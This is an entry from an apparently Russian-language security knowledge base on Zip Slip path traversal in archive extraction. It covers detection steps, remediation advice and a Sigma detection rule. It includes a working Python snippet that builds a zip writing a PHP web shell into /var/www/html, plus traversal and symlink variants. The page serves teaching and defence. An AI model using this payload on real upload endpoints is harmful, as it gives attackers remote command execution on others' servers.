---
id: upload-zip-slip-archive
title: "Zip Slip: запись файлов при распаковке архива"
type: upload
target: generic
category: web
difficulty: intermediate
bypass: none
tags: [file-upload, archive, path-traversal, zip-slip]
tested_on: ["Java", "Python zipfile", "Node unzipper", "Go archive/zip", ".NET"]
success_rate: 0.4
risk: critical
cwe: "CWE-22"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Zip_Slip_Attack"
graph:
  - target: "file-upload"
    type: instance_of
  - target: "lfi-rfi"
    type: related_to
  - target: "rce"
    type: leads_to
  - target: "ci-cd"
    type: related_to
---

# Zip Slip: запись файлов при распаковке архива

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# архив, внутри которого запись с именем ../../shell.php
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
PY
```

## Explanation

Распаковка архива почти везде реализована как «взять имя записи и склеить
с целевым каталогом». Если имя содержит `../`, файл записывается наружу —
в веб-корень, в `~/.ssh`, в cron, в каталог автозапуска или поверх
конфигурационных файлов. Класс назвали Zip Slip (2018), затронул сотни библиотек.

Точки входа: загрузка архива пользователем, импорт «плагина/темы»,
обновление приложения, CI-артефакты, зависимости пакетных менеджеров,
обрабатывающие tar/zip (Docker-слои, Helm-чарты, .docx/.xlsx — это тоже zip).

Опасные варианты имён: `../x`, `/etc/passwd` (абсолютный),
`..%2f..%2fx`, символические ссылки внутри архива (symlink attack:
ссылка на `/etc/passwd`, затем запись через неё).

## Detection

1. Создайте архив с записью `../../hb-test.txt` (код выше) и загрузите его.
2. Проверьте, появился ли файл вне каталога распаковки.
3. Отдельно проверьте symlink-записи (`zip -y` с ссылкой на системный файл).
4. Статический анализ: `new File(destDir, entry.getName())`,
   `os.path.join(dest, name)` без нормализации, `zipfile.extractall(dest)`
   в Python < 3.6.2-патчей.
5. В логах: записи вне целевого каталога, ошибки прав при распаковке.

## Remediation

- После склейки пути нормализовать и проверять префикс:
  `dest.resolve().is_relative_to(baseDir)` (Java), `os.path.realpath`
  + `startswith` (Python), `path.resolve()` (Node).
- Использовать безопасные API: `zipfile.extractall` в свежих Python
  (отбрасывает `..`), `Apache Commons Compress` с валидацией, `securejoin`.
- Отклонять архивы с абсолютными путями, `..` и symlink-записями.
- Распаковывать в пустой временный каталог с правами только на запись,
  затем перемещать разрешённые файлы по whitelist.
- Лимиты: число записей, суммарный размер (защита от zip-bomb),
  глубина вложенности.
- FIM/auditd на системных каталогах.

## Variants

```
symlink внутри архива -> /etc/passwd
```

```
абсолютный путь /var/www/x.php
```

```
tar с записью ../../x
```

```
nested zip-bomb
```

## Detection rules

```yaml
title: Zip Slip — запись файлов вне каталога при распаковке архива
id: e5f6a7b8-0061-4e5f-9a7b-000000000061
status: experimental
description: >-
  Архив содержит записи с ../ в имени: распаковщик пишет файл за пределами
  целевого каталога (в веб-корень). Признаки: traversal в списке записей
  архива и запись файлов unzip/tar в каталоги веб-сервера (auditd).
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://snyk.io/research/zip-slip-vulnerability
logsource:
  category: application
  definition: 'логи распаковки архивов + auditd на запись в веб-корень'
detection:
  extract_marker:
    event_action: archive_extract
    file_preview|contains:
      - '../'
      - '..\'
  audit_webroot_write:
    EventType: PATH
    Image|endswith:
      - '/unzip'
      - '/tar'
      - '/7z'
      - '/bsdtar'
    Name|startswith:
      - '/var/www/'
      - '/srv/www/'
      - '/usr/share/nginx/'
  condition: extract_marker or audit_webroot_write
fields:
  - source_ip
  - filename
  - file_preview
  - Name
  - Image
falsepositives:
  - деплой-архивы, которые легитимно распаковываются в веб-корень из CI (белый список по User)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.22
```
